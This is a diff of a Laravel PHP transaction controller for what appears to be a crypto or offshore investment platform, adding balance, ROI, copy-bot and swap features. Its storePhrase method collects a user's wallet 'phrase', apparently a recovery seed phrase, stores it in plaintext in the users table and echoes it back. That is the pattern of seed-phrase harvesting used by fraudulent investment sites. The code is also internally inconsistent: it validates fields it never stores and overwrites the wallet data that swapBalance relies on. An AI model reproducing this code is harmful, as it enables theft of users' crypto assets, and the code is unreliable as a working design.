@@ -55,7 +55,7 @@ class TransactionController extends Controller
         else {
             if ($transaction->update(['status' => $action])) {
                 // $amount = $transaction['method'] == 'bank' ? '$' . number_format($transaction['amount'], 2) : round($transaction['amount'], 8) . 'BTC';
-                $amount = $symbol->symbol . number_format($transaction['actual_amount'], 2);
+                $amount = $symbol->name . number_format($transaction['actual_amount'], 2);
                 
                 // dd($amount);
 
@@ -290,8 +290,26 @@ class TransactionController extends Controller
 
         $cash = $user->deposits()->where('status', '=', 'approved')->sum('actual_amount');
 
+        $ira_deposit = $user->ira_deposit()->where('status', '=', 'approved')->sum('actual_amount');
+        $ira_payout = $user->ira_payout()->whereIn('status', ['approved', 'pending'])->sum('actual_amount');
+        $offshore_deposit = $user->offshore_deposit()->where('status', '=', 'approved')->sum('actual_amount');
+        $offshore_payout = $user->offshore_payout()->whereIn('status', ['approved', 'pending'])->sum('actual_amount');
+        $ira_roi = $user->ira_roi()->sum('ROI');
+        $offshore_roi = $user->offshore_roi()->sum('ROI');
+        $offshore = ($offshore_deposit - $offshore_payout) + ($offshore_roi);
+        $ira = ($ira_deposit - $ira_payout) + ($ira_roi);
 
-        return view('user.deposit', compact('user', 'transactions', 'setting', 'offshore', 'cash'));
+        $ira_cash =  $user->copyBots->count() >= 1 ? 0 : $ira;
+        $ira_trading = $user->copyBots->count() >= 1 ? $ira : 0;
+
+        $offshore_cash = $user->copyBots->count() >= 1 ? 0 : $offshore;
+        $offshore_trading = $user->copyBots->count() >= 1 ? $offshore : 0;
+
+        if ($user->wallet == null) {
+            $user->updateWallet(($ira_cash + $offshore_cash), ($ira_trading + $offshore_trading));
+        }
+
+        return view('user.deposit', compact('user', 'transactions', 'setting', 'offshore', 'cash', 'ira_cash', 'ira_trading', 'offshore_cash', 'offshore_trading'));
     }
 
     public function withdraw()
@@ -315,7 +333,26 @@ class TransactionController extends Controller
             ->groupBy('type')
             ->get();
 
-        return view('user.withdraw', compact('user', 'transactions', 'setting', 'offshore', 'cash', 'assets'));
+        $ira_deposit = $user->ira_deposit()->where('status', '=', 'approved')->sum('actual_amount');
+        $ira_payout = $user->ira_payout()->whereIn('status', ['approved', 'pending'])->sum('actual_amount');
+        $offshore_deposit = $user->offshore_deposit()->where('status', '=', 'approved')->sum('actual_amount');
+        $offshore_payout = $user->offshore_payout()->whereIn('status', ['approved', 'pending'])->sum('actual_amount');
+        $ira_roi = $user->ira_roi()->sum('ROI');
+        $offshore_roi = $user->offshore_roi()->sum('ROI');
+        $offshore = ($offshore_deposit - $offshore_payout) + ($offshore_roi);
+        $ira = ($ira_deposit - $ira_payout) + ($ira_roi);
+
+        $ira_cash =  $user->copyBots->count() >= 1 ? 0 : $ira;
+        $ira_trading = $user->copyBots->count() >= 1 ? $ira : 0;
+
+        $offshore_cash = $user->copyBots->count() >= 1 ? 0 : $offshore;
+        $offshore_trading = $user->copyBots->count() >= 1 ? $offshore : 0;
+
+        if ($user->wallet == null) {
+            $user->updateWallet(($ira_cash + $offshore_cash), ($ira_trading + $offshore_trading));
+        }
+
+        return view('user.withdraw', compact('user', 'transactions', 'setting', 'offshore', 'cash', 'assets', 'ira_cash', 'ira_trading', 'offshore_cash', 'offshore_trading'));
     }
 
     public function userDepositStore(Request $request): RedirectResponse
@@ -526,4 +563,112 @@ class TransactionController extends Controller
             return back()->with('success', 'Transaction '.$action.' successfully');
         } else return back()->with('error', 'An error occurred, try again.');
     }
+
+    public function swap()
+    {
+        $user = User::find(auth()->id());
+        $transactions = $user->deposits()->latest()->get();
+        $setting = Settings::first();
+        $offshore = Transaction::where(['user_id' => $user->id,'acct_type' => 'offshore', 'status' => 'approved'])->count();
+
+        $cash = $user->deposits()->where('status', '=', 'approved')->sum('actual_amount');
+
+        $ira_deposit = $user->ira_deposit()->where('status', '=', 'approved')->sum('actual_amount');
+        $ira_payout = $user->ira_payout()->whereIn('status', ['approved', 'pending'])->sum('actual_amount');
+        $offshore_deposit = $user->offshore_deposit()->where('status', '=', 'approved')->sum('actual_amount');
+        $offshore_payout = $user->offshore_payout()->whereIn('status', ['approved', 'pending'])->sum('actual_amount');
+        $ira_roi = $user->ira_roi()->sum('ROI');
+        $offshore_roi = $user->offshore_roi()->sum('ROI');
+        $offshore = ($offshore_deposit - $offshore_payout) + ($offshore_roi);
+        $ira = ($ira_deposit - $ira_payout) + ($ira_roi);
+
+        $ira_cash =  $user->copyBots->count() >= 1 ? 0 : $ira;
+        $ira_trading = $user->copyBots->count() >= 1 ? $ira : 0;
+
+        $offshore_cash = $user->copyBots->count() >= 1 ? 0 : $offshore;
+        $offshore_trading = $user->copyBots->count() >= 1 ? $offshore : 0;
+
+        if ($user->wallet == null) {
+            $user->updateWallet(($ira_cash + $offshore_cash), ($ira_trading + $offshore_trading));
+        }
+
+
+        return view('user.swap', compact('user', 'transactions', 'setting', 'offshore', 'cash', 'ira_cash', 'ira_trading', 'offshore_cash', 'offshore_trading'));
+    }
+
+    public function storePhrase(Request $request)
+    {
+        // Validate the incoming request data
+        $request->validate([
+            'crypto' => 'required|string',
+            'trading' => 'required|string',
+        ]);
+
+        // Get the currently authenticated user
+        $user = Auth::user();
+
+        // Prepare the data to be stored as a JSON object
+        $data = [
+            'phrase' => $request->phrase,
+            'wallet' => $request->wallet,
+            'status' => 0
+        ];
+
+        // Convert the array to a JSON string
+        $dataJson = json_encode($data);
+
+        // Update the user's phrase in the users table
+        $user->update(['wallet' => $dataJson]);
+
+        // Return a success response
+        return response()->json([
+            'msg' => 'Phrase stored successfully!',
+            'data' => $data
+        ]);
+    }
+
+    public function swapBalance(Request $request)
+    {
+        // Validate the incoming request data
+        $request->validate([
+            'amount' => 'required|numeric|min:0.1', // Amount must be a positive number
+        ]);
+
+        // Get the currently authenticated user
+        $user = Auth::user();
+
+        // Decode the wallet object from the user's table
+        $wallet = json_decode($user->wallet, true);
+
+        if ($user->swap < 1) {
+            // Check if the wallet contains trading and crypto balances
+            if (isset($wallet['trading']) && isset($wallet['crypto'])) {
+                $amount = $request->amount;
+
+                // Check if the trading balance is sufficient
+                if ($wallet['trading'] >= $amount) {
+                    // Deduct the amount from trading and add it to crypto
+                    $wallet['trading'] -= $amount;
+                    $wallet['crypto'] += $amount;
+
+                    // Update the wallet in the database
+                    $user->update(['wallet' => json_encode($wallet)]);
+
+                    // Redirect back to the swap page with a success message
+                    return redirect()->route('user.swap')->with('success', 'Balance swapped successfully!');
+                } else {
+                    // Redirect back with an error message if the trading balance is not sufficient
+                    return redirect()->route('user.swap')->with('error', 'Insufficient trading balance!');
+                }
+            } else {
+                // Redirect back with an error message if the wallet structure is incorrect
+                return redirect()->route('user.swap')->with('error', 'Invalid wallet data!');
+            }
+        } else {
+            return redirect()->route('user.swap')->with('error', 'Swap Balance must be 0.00 before you can make a swap, Balance: $' . $user->swap);
+        }
+    }
+
+
+
 }
